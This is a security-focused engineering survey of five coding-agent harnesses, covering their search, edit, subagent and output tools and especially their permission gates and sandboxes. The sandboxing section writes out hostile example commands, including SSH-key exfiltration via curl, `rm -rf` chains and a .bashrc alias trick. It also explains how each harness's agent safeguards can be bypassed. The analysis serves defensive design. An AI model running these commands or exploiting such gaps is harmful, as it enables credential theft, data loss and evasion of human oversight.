# Tool-set survey - five agent harnesses, read as interfaces

Six codebases read in parallel by subagents, on lab2x1. A survey of **interfaces**: tool names,
argument schemas, return shapes, documented behaviour, and the gate in front of each. No
implementation code was copied; schemas and model-facing descriptions are quoted because those
are the artefact under study.

| harness | identity | licence |
|---|---|---|
| grok-build | `SOURCE_REV` `eb4a894d` | Apache-2.0 |
| opencode | v1.18.29 | MIT |
| pi | `@earendil-works/pi-coding-agent` v0.85.1 | MIT |
| omp (oh-my-pi) | v18.1.15 | MIT |
| deepseek-harness | `dsh-0.1.5-alpha.1` | MIT |
| letibot | for comparison | - |

In each monorepo the set surveyed is the one the shipped CLI assembles: grok-build's
`GrokBuild` namespace (four alternates, unsurveyed), opencode's `packages/opencode/src/tool/`
(a newer unwired v2 tree is cited only where it contradicts the live set), pi's
`packages/coding-agent`, omp's `packages/coding-agent` plus its Rust crates, dsh's
`packages/*/tool-*` anchored on the `dsh-base` bundle and its four agent presets.

**Deliberately excluded:** `omo/` and `omo-slim/` (oh-my-openagent, Sustainable Use Licence) and
`crush/` (Functional Source Licence 1.1). Both restrict derivative and competing use, which
makes reading them as prior art a legal question rather than an engineering one.

## The scorecard

| | opencode | pi | omp | grok-build | dsh | **letibot** |
|---|---|---|---|---|---|---|
| **1.** search reports a files-searched denominator | no | no | **computed, withheld** | no | no | **yes** |
| … zero-files distinguished from zero-matches | no | no | timeout only | no | no | **yes** |
| **2.** read-before-write enforced at runtime | **no** (falsely claimed) | no | **yes** (digest) | **no** (says so) | **yes** (stat CAS) | **yes** (per-line) |
| **3.** structural / AST tool | no | no | **yes** | no | no | **yes** (`outline`) |
| … LSP navigation tool | flag-gated | no | yes | flag-gated | not mounted | yes |
| **4.** subagent spawn tool | yes | example only | yes | yes | yes | **yes** |
| … concurrency ceiling | **none** | 4 (example) | 32 | 32 | **none** | none found |
| … depth ceiling | 1 | n/a | 2 | 1 | 3 | 3, refused by name |
| **5.** output capped by default | yes | yes | yes | yes | yes | **no** (unset) |
| … told it was truncated | yes | yes | yes | mostly | yes | yes |
| … given a way to fetch the rest | spill path | offset + spill | `artifact://` | spill path | spill path | **`read_spill`** |
| **6.** edit matching | **fuzzy, written** | **fuzzy, written** | **fuzzy, written** | relaxed (opt-in) | **exact only** | **exact only** |
| … model told the match was relaxed | no | no | no | no | n/a | n/a (never applied) |

**Nobody has row 1.** omp comes closest and then throws the number away. **Three of five write a
match the model did not ask for and do not mention it.** Only two of the five enforce the
read-before-write rule that four of them talk about.

## 1. The tool sets

### 1.1 opencode - v1.18.29

`bash` (non-zero exit is **not** an error - the code goes to `metadata.exit`), `read` (a numbered
window plus up to three fuzzy siblings on a miss), `glob`, `grep`, `edit`/`write`/`apply_patch`
(the last is the only edit route for `gpt-*`), `task`, `webfetch`, `websearch`, `todowrite`,
`skill`, `question`, `plan_exit`, `lsp` (nine operations, behind an experimental flag),
`execute` (code mode over MCP), `invalid` (a decoy that reports bad arguments).

**Gate.** `evaluate` takes the last matching rule and defaults to `ask`, but **the default
ruleset is `"*": "allow"`**, so `bash`, `edit`, `write` and `apply_patch` run with no prompt.
There is **no sandbox**: an out-of-worktree path becomes an ask, not a block. Nine tools send
`always: ["*"]`, so one approval allows that whole tool. And because an approved grant is
searched *after* the config ruleset in a last-match-wins list, **one "Always" click silently
disables any config `deny` the pattern covers - including opencode's own `.env` guard.**

### 1.2 pi - coding-agent v0.85.1

Four tools active: `read`, `bash`, `edit`, `write`; `grep`, `find`, `ls` and `powershell` are
opt-in, and there is **no task, todo, web or LSP tool**. `read` gives raw text with no line
numbers and throws a raw `ENOENT` on a miss; `bash` has **no default timeout**; `edit` is
advertised as exact and is not (§3.6); `grep`/`find` shell out to `rg`/`fd` and **download the
binary from GitHub on first use**, so two nominally read-only tools carry a network side-channel.

**No built-in approval system at all.** The one gate point is the `beforeToolCall` extension
hook, which **returns `undefined` immediately if no extension registered a handler**, and
mutated input is not re-validated.

### 1.3 omp (oh-my-pi) - v18.1.15

**`xd://` device mounting**, on by default: tools declaring `loadMode = "discoverable"` are
**removed from the request's tools array** and driven through `read`/`write` against internal
URLs (`read xd://` lists, `read xd://<tool>` gives docs and schema, `write xd://<tool>` executes
with the JSON args as `content`). That leaves 14 top-level schemas - `read, write, bash, edit,
glob, eval, task, hub, learn, manage_skill, todo, ask, grep, web_search` - and 12 devices:
`ast_grep, ast_edit, debug, github, lsp, checkpoint, rewind, security_scan, memory_edit, retain,
recall, reflect`. A schema comes back on mismatch, so a malformed call self-corrects. `read`'s
schema is `path` alone: every option rides an inline selector grammar on the path (`:50-200`,
`:raw`, `:img`, `?q=`, `archive.zip:inner`). `browser` and `computer` are **not tools** - they
are preludes injected into the `eval` kernel.

**Gate:** three tiers `read < write < exec` and three modes `always-ask` / `write` / `yolo`,
resolved as the tool's own `approval(args)` → user setting → mode/tier comparison, with **an
omitted `approval` defaulting to `exec`**. `AgentToolResult.details` is UI-only, so **anything
living only in `details` never reaches the model**.

### 1.4 grok-build

Seventeen core tools plus conditionals and a plan-mode trio. **Model-facing names are not tool
ids**: five tools and two params are renamed (`task` → `spawn_subagent`), and full name
randomization per deployment is supported. Auto-allow: `read_file`, `list_dir`, `grep`,
`web_search`, `lsp` (feature off by default), `todo_write`, `update_goal`. Prompts:
`search_replace`, `run_terminal_command`/`monitor` (the full bash pipeline, §4), `use_tool` for
MCP. No prompt at all: `spawn_subagent`, `workflow`, `scheduler_*`, `image_*`.

**Two classification gaps.** Media generation, the scheduler and `workflow` have no explicit
`AccessKind` arm and fall through a catch-all `_ => Read(None)`, so network-calling,
file-writing and subagent-spawning tools are auto-approved as if read-only; and `Read` is
*unconditionally allowed*, with no path, so a path-patterned rule cannot match it either.
Declared scopes are inconsistent in both directions: `scheduler_list` declares `Write` for a pure
read, while `todo_write` and `update_goal` declare `Read` while mutating session state.
(letibot's `Access` has a `Session` class for exactly this; its doc comment cites this finding.)
`search_tool` **does not search code** despite the name - it is BM25 over the MCP tool index.

### 1.5 deepseek-harness - dsh 0.1.5-alpha.1

A Cordis "everything-is-a-plugin" monorepo: ~25 tools are separate plugin packages, and **which
ones the model sees is a composition decision**. Three framework facts govern every row: the
model sees only `name`/`description`/`parameters`; parameter schemas carry no constraints beyond
type/enum/const/default, so every numeric bound is an execute-time throw; and every throw becomes
a soft error result with no hard failure path. `dsh-base`, `standard` and `ptc` mount `bash`/`pwsh`
one-shot, the fs group, `job_*`, `skill`, `todo_write`, the goal tools, `exit_plan_mode`, five
subagent tools, `workflow`, `ralph`, `web_search`, `web_fetch`; `minimal` mounts a persistent PTY
and `str_replace_editor` instead of the fs group.

**The most distinctive choice in the five.** The `ptc` preset sends **exactly one tool schema -
`run_code`** - plus a generated TypeScript/Python SDK declaring the rest, and a direct call naming
any other tool is refused: *"only `run_code` is callable directly - call `<name>` from inside a
`run_code` program instead"*. There is a generic `ask` gate, but **almost no tool uses it**; the
real gate is the sandbox (§4).

### 1.6 letibot, for comparison

Eight read-only tools and a wider session set; the ceiling is `DEFAULT_MAX_TOOLS = 16`, and a role
that wants more is refused by name rather than truncated. `read`/`grep`/`glob` carry the
denominator and the relaxation ladder; `outline` answers "what does this file define" **from a
parse rather than a pattern**; `ask_code`/`ask_corpus` are retrieval, `NotRun` when nothing is
attached; `read_spill` fetches the rest of a bounded output by content hash; `edit` may only
replace lines a tool displayed; `bash`/`ps`/`pkill`/`monitor`/`jobs` control processes by handle,
never by pattern; `task` is seated with `task_result`, `task_message` and `task_start`.

`Access` has five values (`Read`, `Write`, `Exec`, `Network`, `Session`); the default gate is
`NoAdjudicator` and refuses with **`NotRun` - nobody decided - not `Denied`**; and a `NEVER_WRITE`
list is evaluated before any adjudicator and overridable by none.

## 2. The six questions

### 2.1 Does any search tool distinguish "the pattern is not present" from "I searched zero files"?

**Four of the five: no. The fifth computes the number and does not tell the model. letibot is the
only one that reports the denominator.** This is the defect that prompted the survey: letibot's
`grep` once reported an empty corpus as an empty result about a tree holding nine matches, because
a `glob` matched no paths.

- **opencode** returns one shared constant, `"No files found"`, from both `grep` and `glob`, and it
  fires when files *were* searched and nothing matched. Worse, **a `path` that does not exist is
  not an error either** - the ternary falls through to `path.dirname(search)`, so grep silently
  searches the parent directory. Files searched is never computed.
- **pi** has no counter and treats ripgrep's exit 1 as success, so glob-matched-nothing and
  pattern-absent land in one branch. Hitting the 100-match cap **kills the rg child**, so the
  search is abandoned and the model is not told how much went unsearched.
- **dsh** has the denominator **available and deliberately dropped**: `parseRecord` skips
  ripgrep's `summary` record and `buildGrepCommand` never passes `--stats`. A non-existent path
  does surface (rg exit 2 → `SEARCH_FAILED`), so a bad path is loud and a bad glob is silent.
- **grok-build** folds ripgrep's zero-denominator signal into the same `"No matches found"` as a
  genuine zero-match search; `.gitignore` and policy `DenyReadGlobs` shrink the corpus with no
  disclosure. Its path case is the best of the five - `Error: {path} does not exist.` plus "Did you
  mean {p}?" - and its timeout says the search may have matched files but did not complete.
- **omp computes it, withholds it**: `filesSearched` is threaded through the pipeline but
  `GrepToolDetails` has no such field, and `details` is UI-only. It is the only one that thinks
  about the problem: all-missing paths throw while some-missing paths append `Skipped missing
  paths: {…}`; **a glob timeout with zero hits is an explicit abstention** (*"the scan is
  incomplete, NOT proof of absence"*); and `ast_grep` with zero matches *and* parse errors says the
  query may be mis-scoped.
- **letibot** treats a zero denominator as a **scope failure**: zero files opened is `failed`
  (`` 0 files matched the scope, so `{source}` was never searched for ``), a genuinely absent
  pattern is `abstained` (`` `{source}` does not occur in the {files_scanned} file(s) searched ``),
  and a missing scope path is `failed` with the nearest listing. `scanned` increments only after a
  successful read, so it means *files actually opened as text*.

### 2.2 Does any harness ENFORCE read-before-write, rather than promising it?

**Three of five do not enforce it, and two of those claim in a description string that they do.
Two enforce it by different mechanisms, and both have a hole.**

| harness | enforced? | mechanism |
|---|---|---|
| opencode | **no** - and falsely claimed | none; `edit` reads the file itself just before writing |
| pi | **no** - and not even claimed | none; `getFileRevision()` exists and every call site is a config store |
| grok-build | **no** - and says so in a code comment | config-time toolset check, once, when the toolset is finalized |
| omp | **yes**, in the default mode | **content digest** - a 4-hex xxhash of the normalized content, minted into a session store by `read`/`grep`/`write` |
| dsh | **yes** | **stat-tuple CAS** (`dev:ino:size:mtimeNs:ctimeNs`) inside a per-target lock |
| letibot | **yes** | **per-line fingerprints** in a session ledger; an edit may only replace lines a tool displayed |

The three that do not enforce it differ only in candour: grok-build's comment says
read-before-edit is "encouraged via description and RL grading, not runtime-enforced" and it has a
test named `consecutive_edits_succeed_without_prior_read`; pi never claims it; opencode ships two
false description strings.

Both enforcers gain a distinction mtime cannot make, and both have holes. omp tells a tag minted
this session from one minted in a prior session, which is why it can say *"copy the [path#newhash]
header from that edit's response"* instead of *"re-read"* - but a head/tail-only edit **applies
anyway** on mismatch with a drift warning, its stronger guard (rejecting an edit anchored on lines
a read never displayed) is wired to a setting that **defaults false**, and the `replace` mode has
no check at all, with a silent downgrade to it for several model classes. dsh's: enforcement lives
in a separate plugin whose own comment says removing it leaves unconditional mutation, and the
`minimal` preset uses the bare provider without it.

### 2.3 Structural / AST tools

**One of the five ships a structural tool. Four ship an LSP tool, three of those off by default or
unmounted.**

omp is the only real prior art, in three layers: an engine (`ast-grep-core` plus ~58 tree-sitter
grammars); `ast_grep`/`ast_edit` over it, with `ast_edit` always dry-running and staging a proposal
the model confirms by writing a reason to `xd://resolve`; and AST-driven `read` folding, **on by
default** - parseable code with no selector gets a structural summary with bodies elided and a
footer naming the recovery selector. That folding is automatic compression, not a query: there is
no parameter to ask for "the symbols in this file", and symbol search is LSP-backed rather than
part of the AST layer. The gap in omp's own AST layer is the §2.1 defect one layer up -
`ast_grep` cannot distinguish "language unsupported" from "file unparseable" from "pattern
absent", because all three collapse into one zero-match plus a string list.

LSP: opencode 9 operations behind an experimental flag; grok-build 6, `default_enabled: false`,
needing a hand-written `lsp.json` that is folder-trust gated; dsh 4, mounted in no shipped
composition; omp 14, reachable as an `xd://` device. Two schema mistakes to avoid: opencode
**forces `line` and `character` to be supplied even for `documentSymbol` and `workspaceSymbol`**,
where they are discarded; grok-build takes 0-indexed input and emits 1-based output. And two of the
four use tree-sitter for something else entirely - **both use AST parsing to police the model
rather than to help it**.

### 2.4 Subagent / task tools

**Four of five ship one; pi ships an example.**

| | opencode | pi (example) | omp | grok-build | dsh |
|---|---|---|---|---|---|
| agent selected by | `subagent_type` param | `agent` param | `agent` per task | `subagent_type` param | **the tool name** - backend bound at load |
| child tool set | derived, denies added | per-agent allowlist | per-agent allowlist | three stacked layers | **the parent's composition, unfiltered by default** |
| **concurrency ceiling** | **none** | **4** | **32** (semaphore) | **32** (queue, not fail) | **none** |
| **depth ceiling** | **1** | n/a | **2**, enforced by the tool disappearing | **1**, `Task` stripped | **3** |

Three things to take. **A ceiling is not optional**: two of the five ship none, and opencode's only
limiter is depth while its own description encourages parallel calls. **A depth limit enforced by
omission** (omp) or by stripping the tool (grok-build) beats a runtime check the model can hit. And
**a child's tool set should be an allowlist** - dsh gives the child the parent's whole composition
and relies on a policy pin.

### 2.5 Output capping

**All five cap; four spill to a file or URL and tell the model where. The differences are in what
is capped silently and what has no recovery path.** opencode and omp wrap every tool; pi and
grok-build cap per tool. Line and byte caps: 2000 / 50 KiB (opencode, pi), 3000 / 50 KiB (omp), a
1000-line read window and 40 000 bytes (grok-build), 2000 / 50 000 (dsh). Spill targets: a
tool-output directory with a 7-day GC (opencode), a `/tmp` file (pi), `artifact://<id>` (omp), a
plain file path (grok-build), a 0700 per-session path (dsh).

Four properties worth stealing. **The notice's byte cost is reserved inside the cap**, so the
replacement can never exceed it. **`read` is excluded by name** from spilling, to avoid a
read→spill→read loop. **A spill failure fails open**: no owner, no backend, a save failure, or a
notice that will not fit all leave the original inline, so a spill failure never turns success into
an error. And **the spill directory must be reachable by the model** - opencode adds it to the
external-directory allow-list, which three of the others get wrong by omission.

The worst cases are where a cap has no recovery path: opencode's `grep`/`glob` hard 100-row cap has
no pagination and infers truncation from `rows.length === limit`, so exactly 100 real matches are
reported as truncated; grok-build's `read_file` **truncates its 1000-line window silently**; dsh's
persistent PTY clips at 16 000 chars keeping the *head* and advises a `grep` on a file that does
not exist, and its compaction pruner inserts `[... tool result middle pruned ...]` with no locator
and no way back.

### 2.6 Edit tooling shape

**Three of five write a match the model did not ask for and say nothing about it. Two are
exact-only.**

| | matching | threshold | relaxed match written? | model told? |
|---|---|---|---|---|
| opencode | **9 replacers** | **0.65** Levenshtein | **yes** | **no** |
| pi | exact, then **normalizing fuzzy** | none - canonicalization | **yes**, and it rewrites every touched line | **no** |
| omp | **9-step ladder** | **0.95**, fuzzy on by default | **yes**, re-indented to the found site | **no** |
| grok-build | exact + CRLF; unicode-confusable fallback **opt-in, default off** | none - an 8-entry table | **yes** when enabled | **no** |
| dsh | **exact literal only** | n/a | n/a | n/a |
| **letibot** | **exact only**; relaxation is a *diagnosis* | n/a | **never** | n/a - reported, with the exact bytes |

What matters is not the threshold but that **the model is never told**. opencode writes at 0.65 and
answers `"Edit applied successfully."`; the relaxed span is visible only in a permission-ask diff,
and on the stock agent `edit` is `allow`, so no card is shown. pi's behaviour is the most
surprising: **if any edit needed fuzzy matching, the replacement base becomes the fuzzy-normalized
whole file**, so every touched line gets smart quotes folded to ASCII and trailing whitespace
stripped whether the model asked or not - and `usedFuzzyMatch` appears in neither the result text
nor `details`. omp re-indents the replacement to the indentation actually found at the fuzzy span,
and confidence surfaces only on failure. dsh is exact-only and says so in the description, which is
the cheapest correct answer; its `minimal` preset's alternative reports the line numbers of
ambiguous matches, which `edit` does not - worth copying.

letibot's rule, from its module doc: **a relaxed match is a diagnosis, never an application.** Its
ladder is five exact-after-key-mapping rungs (trailing whitespace, indentation, inner whitespace,
case, anchors), every rung an equality test rather than a distance, and the refusal returns the
exact bytes so the retry is a copy.

## 3. Sandboxing and permissions

The first pass covered permission *policy* and never searched for sandbox *mechanism*; this section
closes that difference.

**The assumption going in - that nobody has a real sandbox and it would have to be built from
primitives - is refuted.** Two of the five have genuine kernel enforcement: dsh (bubblewrap, a
*vendored Landlock launcher with its C source included for audit*, macOS Seatbelt, a Windows
restricted-token runner, arbitrated by functional probes and failing closed), and grok-build
(process-wide rather than per-command, via the `nono` crate plus bubblewrap for the
deny-a-subpath case Landlock cannot express, plus two hand-assembled seccomp-BPF filters). pi and
opencode say in their own security documentation that they have none; omp says so in its tool docs.

So the question is not "can this be built" but "which of two working designs to copy", and they
differ in a way that matters more than either's details: **dsh confines per spawned command and
leaves the harness unconfined; grok-build confines the harness once at startup and lets children
inherit.**

| | grok-build | dsh | omp | opencode | pi |
|---|---|---|---|---|---|
| OS confinement exists | **yes** | **yes** | no | no | no (example only) |
| on by default | **no** - profile resolves to `"off"` | **yes** | - | - | no |
| confines what | **the harness process** | **each spawned child** | - | - | the bash child only |
| when unavailable | built-in profile: warn, run unconfined; custom: exit 1 | **refuse** | - | - | **fail open**, notify only |
| backend chosen by | platform `cfg` + support probe | **functional probe: runs `true` under the profile** | - | - | platform check |
| network egress controlled | per-child seccomp, in 2 of 6 profiles | no (documented gap) | no | no | only via the unshipped example |
| child env filtered | mechanism exists, default no-op | **regex scrub**, and a `.env` may not set `PATH`/`LD_PRELOAD`/`BASH_ENV` | no | no, and it **injects** a token | no |
| credential paths blocked | write-side only | **no** - "every mode permits reading" | no | `*.env` on `read` only | no |
| command parser | **tree-sitter-bash**, node-kind allowlist, fails **closed** | **none, by design** | hand-written scanners; deny path fails **open** | tree-sitter-bash; **fails OPEN** | **none** |
| default for an ungated command | prompt | allow | **allow** (`yolo`) | **allow** (`"*": "allow"`) | **allow** (no gate) |
| grant granularity | prefix; **exact whole-command for dangerous verbs** | **one-shot only** | whole tool | whole tool / `bash *` | n/a |
| grant persistence | **per git repo**, merge-on-write | mode only, never a grant | hand-edited config | in-memory, **per directory** | project trust, hierarchical |
| deny before blanket-approve | yes | n/a | yes | yes - **but an approved `*` outranks a config deny** | n/a |

### The strongest thing each has, and how it is defeated

**dsh - the reference implementation.** Its seam is honest, and three properties make it the model:
it **fails closed** (no usable backend is `SANDBOX_UNAVAILABLE`, never unconfined passthrough);
backends are **chosen by functional probe**, running `true` under the candidate profile rather than
sniffing a version; and **partial enforcement is reported as partial, with the reasons, in the
code**. It also solves the persistent-shell hazard - the PTY is confined once at spawn and any
`sandbox/mode` change while one is open **throws** - and its "always allow" problem does not exist,
because *the vocabulary has no such option*.

Defeated three ways, all named by the project itself. **Reads and network are entirely
uncontained**: the seam expresses no network, process, syscall, device or credential restriction,
the bwrap profile omits `--unshare-net`, the Seatbelt profile is `(allow default)` with only writes
denied, and `fs-sandbox` says "every mode permits reading". So **exfiltration needs no bypass at
all** - `cat ~/.ssh/id_rsa | curl -T- …` is fully permitted. A write fence without a read fence
stops damage and not theft. Second, **the harness is unconfined, and a confined child can write what
the harness later executes**. Third, **a shipped preset undoes it**: one swaps the confining
filesystem for the bare local one, another pins `danger-full-access` with no approval service
mounted. The safety of a dsh deployment is a property of its composition, not of the product.

**grok-build - the most developed permission stack, switched off by default.** Every layer fails
closed into the next, and the parser is the load-bearing one: it walks the tree-sitter tree against
node-kind and punctuation allowlists and returns `None` on the first unrecognised node, which forces
one conservative whole-script prompt and inserts findings that act as **grant floors**. Chains are
decomposed and each segment classified independently, so `ls && rm -rf /` cannot ride the safe
primary. Three refinements are better than anything else in the survey: **basename matching**, so
`/bin/rm`, `RM` and `rm.exe` all hit the dangerous list; **grant keys that must round-trip**,
re-parsing the joined prefix and requiring the same single argv spanning the whole script, which
closes "approve `git status`, get a grant that also matches `git status; rm -rf /`"; and an
**exec-vehicle list** (`xargs`, `find`, `sudo`, `ssh`, `docker`, `npx`, versioned interpreters)
where a grant is honoured only as an exact whole-command match.

Defeated four ways. **The OS sandbox is off by default**, and when a built-in profile fails to apply
it warns and **continues unconfined**. **Shell aliases and functions from the user's login shell are
invisible to the entire stack, and this is the largest gap in the survey**: the persistent backend
initialises an interactive login shell, captures `declare -f` and `alias -p`, and each later command
is `eval`'d in a shell that **explicitly re-enables alias expansion** - so `alias ls='rm -rf ~'` in
a `.bashrc` yields a request classified as `ls`, an `ALWAYS_SAFE_COMMANDS` entry, that executes
`rm`. **`PATH` shims** likewise: the basename is taken and never resolved through `PATH`. And the
catch-all is worse than the scorecard suggested: the match on `ToolInput` is **not exhaustive**, ~40
variants exist and 17 are named, so image generators, `SchedulerCreate` and `Workflow` fall through
to `Read(None)` and are auto-approved with the reason string `SAFE_COMMAND`; a second, more
reachable catch-all sniffs JSON keys and sends anything unrecognised to the same place.

**omp - the best-designed default that is then turned off.** The strict compound parser rejects the
whole analysis on `$`, backticks, `( ) < > * ? [ ] { } ~ | ; &`, on control characters even inside
quotes, on `VAR=` prefixes, on 14 interpreter names and on ~90 shell-stateful builtins, and it
normalises the basename before the denylist lookups. The comments show adversarial thinking:
`printf` is listed because `printf -v` can retarget a later command; `test` because `test -v`
evaluates command substitutions. And `allow` rules are narrower than `deny`: an allow must match
the **entire** command and may never ride a compound line.

**How it is defeated: the default configuration, in one line.** The approval mode defaults to
`yolo`, whose tier ceiling is `exec` - the top rank - so everything auto-approves; worse, bare
safety overrides are ignored there because a decision with no `policy` reaches the `policy: "allow"`
return. With default settings, `rm -rf /` matches the critical-bash pattern and executes without a
prompt. And the parser is only consulted for user-authored `bash.patterns` rules, which default to
empty - so **in a default install no parsing gates anything**. Three further defeats for a user who
has configured rules: the `deny`/`prompt` matcher uses a loose tokenizer and **fails open** when it
cannot see the structure; `eval` is a separate tool that bypasses `bash.patterns` entirely; and a
genuinely careful containment primitive exists but is **not wired to the model's tools**.

**opencode - a real parser whose failure mode is to skip the prompt.** The tree-sitter parse
genuinely decomposes: `$(...)`, backticks, chains, pipelines, subshells and function bodies each
yield their own pattern, evaluated independently; `VAR=x cmd` is handled correctly by omission; and
the default TUI opens **no TCP socket at all**, so there is no listening port for a spawned child to
reach. Defeated four ways. **The parser fails OPEN**: tree-sitter is error-recovering, so malformed
input yields a tree of `ERROR` nodes; if that produces no command descendants the pattern set is
empty and the ask helper **returns before it asks**, handing the untouched raw string to the shell.
**`bash` defaults to allow**, so the command is materialised, regex-matched against `^.*$`, and
never inspected. **One approval widens to a blanket**: for a command not in its 130-entry arity
table the prefix falls back to `tokens.slice(0,1)`, so approving `bash -c 'echo hi'` stores `bash
*` - and neither `bash`, `sh`, `eval`, `xargs` nor `find` is in the table. **An approved grant
outranks a config `deny`**, which also defeats opencode's own `.env` guard.

**pi - the only one whose position is "we deliberately do not do this".** Its security
documentation lists local code execution as out of scope and says "run in a container, or build your
own confirmation flow with extensions". The code matches: the path that "decides" checks whether any
extension registered a handler and **returns `undefined` immediately** when none did. The one good
thing is worth stealing: **its one gate fails closed** - no try/catch around the handler, so a
throwing permission check propagates and blocks. Its example sandbox is not shipped, and even
installed it fails open on init error and wraps only subprocesses, so its own `denyRead: ["~/.ssh"]`
is enforced against `cat` and not against `read`. A boundary that covers one of two paths to the
same asset is not a boundary.

### The parse, quantified

Three harnesses decide something about a command string, and the results do not favour parsing.
grok-build decomposes chains per segment and recurses into `bash -c` (depth cap 8), but a here-doc
body is never parsed, `xargs`/`find -exec` payloads are not re-parsed, and unparseable input **fails
closed** into a prompt plus a grant floor. opencode decomposes chains and `$(...)` per node and
test-covers it, but a here-doc body is never seen, `bash -c`/`eval` grants collapse to `bash *`/
`eval *`, `-exec` payloads are invisible, `/bin/rm` is a different key from `rm`, there is no
`realpath` on that path, and unparseable input **fails OPEN with no prompt at all**. omp's strict
path rejects the whole analysis on any of those constructs and falls back - closed on the strict
path, **open on the deny path** - and `xargs` is unhandled.

**First: the best parser in the survey is defeated by something it never looks at.** grok-build
closes every construct above, and then the command runs through `eval` in a shell that has replayed
the user's aliases with alias expansion re-enabled. The parser sees the text; the shell sees the
text *plus* a mutable name table the parser cannot read. **A permission decision made on a string
the shell will reinterpret is theatre.**

**Second: parse-failure direction is the single highest-leverage line of code in any of these
harnesses.** grok-build turns "I could not parse this" into a prompt plus a grant floor; opencode
turns the same condition into silent execution; omp does both. Same parser technology, opposite
safety properties, one `if`.

**Third: dsh's answer is better than a parser.** dsh has *no* parser, deliberately, and it does not
matter, because a Landlock or Seatbelt write fence is **parse-independent**: `eval $(curl …)`, a
here-doc-fed `python`, `find -exec` and a `PATH`-shadowed binary all hit the same boundary however
they were spelled. The trade is exact and dsh states it - **effects are contained; capabilities are
not classified** - which is why its uncontained reads and network are the right thing to criticise
and its missing parser is not.

So: **parse to tell the human what is about to happen. Never to decide whether it is safe.**

### Is a model doing the permission handling?

**Four of the five: searched and absent. One has it, and it is built correctly.** grok-build's
classifier sits *after* every deterministic layer and can only fill gaps: a rule-match `Ask` never
reaches the model; only a fail-closed `Ask` - the parser could not decompose - defers to it. It is
shown the raw command plus a fixed, harness-owned token glossary (`unparseable_shell`,
`env_injection`, `dangerous_command`, …) carrying no command text, with transcript turns and
`AGENTS.md` marked untrusted. And **every failure path prompts; none allows**: timeout, unavailable,
unwired, transport error, and malformed output with findings present all route to a prompt, and the
parser refuses to infer `Allow` from loose prose. The parse problem is not solved by the model; it
is summarised for it.

The four absences, briefly: pi has nothing to attach a classifier to; opencode's small-model tier is
called only for session titles and a project-copy handler; omp's approval path is a pure function
with no inference call; dsh's auxiliary-model purpose enum is closed to `compaction | session-title`.

## 4. What is worth copying, and what to avoid

### Copy

1. **dsh's sandbox seam, its three properties before its mechanism**: fail closed on no backend;
   choose the backend by running `true` under the candidate profile; report partial enforcement as
   partial, with reasons.
2. **dsh's vendored-helper-with-source pattern.** A static-musl binary that self-restricts and then
   `execvp`s, with a documented CLI contract, is how you get Landlock without linking a sandbox
   crate into the harness and without trusting a third party's rule ordering. grok-build pins `nono`
   because a rule-ordering change re-opened a macOS deny bypass; vendored source makes that risk
   auditable instead of pinned.
3. **dsh's `sandbox/mode`-change fence for a persistent shell**, and its **boot-time bootstrap-env
   refusal**: a project-supplied `.env` may not set `PATH`, `NODE_OPTIONS`, `LD_PRELOAD`/`LD_AUDIT`,
   `BASH_ENV`, `SHELLOPTS`, `PYTHONSTARTUP`, `GIT_SSH_COMMAND` or any `BASH_FUNC_` name - `BASH_ENV`
   "runs a file of the project's choosing on every single `bash -c`". Nobody else has it, and it is
   perhaps twenty lines.
4. **dsh's one-shot-only grant vocabulary**, which makes the whole grant-widening class
   unrepresentable. If you keep an "allow session", at least adopt the separation: persist a mode,
   never a grant. And **its unknown-concurrency-is-exclusive default**: a tool that does not declare
   itself concurrency-safe is a barrier.
5. **grok-build's grant round-trip requirement**, its **exec-vehicle list with pinned scope** (the
   right response to `xargs`/`sudo`/`ssh`/`docker`/`npx` is not to parse their payloads but to
   refuse to let a *prefix* grant cover them), and its **basename normalisation** before any list
   lookup.
6. **grok-build's classifier architecture**, if a model is plugged in: after every deterministic
   layer, filling only fail-closed gaps; every failure routed to a prompt; refuse to infer an allow
   from prose; enforce a response schema; harness-owned finding tokens carrying no
   attacker-controlled text.
7. **grok-build's project-config asymmetry**: a workspace file may *add* a profile name but never
   *redefine* a global one.
8. **omp's approve-the-post-revision-input ordering**, which closes the mutation-after-approval hole
   pi documents as present; and **pi's no-try/catch-on-the-gate**, so a throwing permission handler
   propagates and blocks.

Two verdicts on constructions the brief named. **omp's omitted-`approval`-defaults-to-`exec` is the
right construction behind the wrong ceiling**: `exec` is the top rank, not "requires approval", so
behind `yolo` an unclassified tool is auto-allowed. Copy the construction and the lesson that a
fail-safe default is worth nothing behind a ceiling set to the top - letibot's
`Access::is_unattended` is true for `Read` and `Session` only, and no mode can raise it. And **an
exhaustive match with no catch-all, enforced by the compiler**, is what grok-build lacked and what
letibot's five-variant `Access` has.

### Avoid

- **A parser as the primary boundary.** Three harnesses built one; the best of them is defeated by
  an alias table it never reads.
- **Any fail-open on the deciding path.** opencode's empty-pattern set, omp's unmatchable command,
  pi's example sandbox, dsh's hook runner and its invalid-regex matcher. Each converts "nobody
  decided" into "approved" while reading as protection.
- **A boundary that covers one of two paths to the same asset.** pi confines the bash child and not
  the in-process fs tools. dsh avoids it deliberately: bash and `write`/`edit` derive the same
  writable-root allowlist from one canonical symlink-resolving helper, and containment compares
  **filesystem identity (`dev`/`ino`) rather than string prefixes**.
- **A write fence with no read fence.** It stops damage and not theft.
- **A model-facing description that claims a boundary the composition does not enforce.**
- **Deferring safety to a composition or preset a later file can swap out.**
- **A hierarchical, permanent trust grant.** Trusting `~` once trusts every repository forever.
- **Environment inheritance by default.** Four of five spread the parent environment into the child,
  and opencode *adds* a credential first. A denylist over environment names is the wrong shape - it
  catches `AWS_SESSION_TOKEN` and misses `GITHUB_PAT`, `NPM_AUTH` and a `DATABASE_URL` with an
  inline password. Use an allowlist.
- **Blanket-approve modes that skip the layer you built.**

## 5. What could not be determined

Nothing was built, run or started; every finding is a static read.

- **grok-build**: whether `schemars` emits a `#[serde(default)]` field as `required`; which of two
  divergent `ToolFilter` enums a given config path deserializes through; whether the 15
  `restrict_child_network` call sites cover *every* process spawn (the calls were enumerated, the
  spawns were not); whether `nono`'s `Sandbox::apply` is best-effort or refuses on old kernels; and
  effective Windows enforcement, which is `cfg(unix)`-only.
- **opencode**: what the model sees for a zero-result `websearch`; whether tree-sitter-bash surfaces
  commands inside **process substitution** as command descendants (the `$(...)` case is
  test-covered, `<(…)` is not); and how often the fail-open is reachable in practice - the code path
  is unambiguous, its trigger frequency is not establishable by reading.
- **omp**: runtime-discovered custom agents cannot be enumerated from a static read; **no
  concurrency ceiling was found for `vibe_spawn`** (absence of evidence, not proof).
- **dsh**: which language servers a real deployment gets (no shipped config configures one); the
  recursion budgets of the out-of-process subagent providers, which is why `maxDepth:
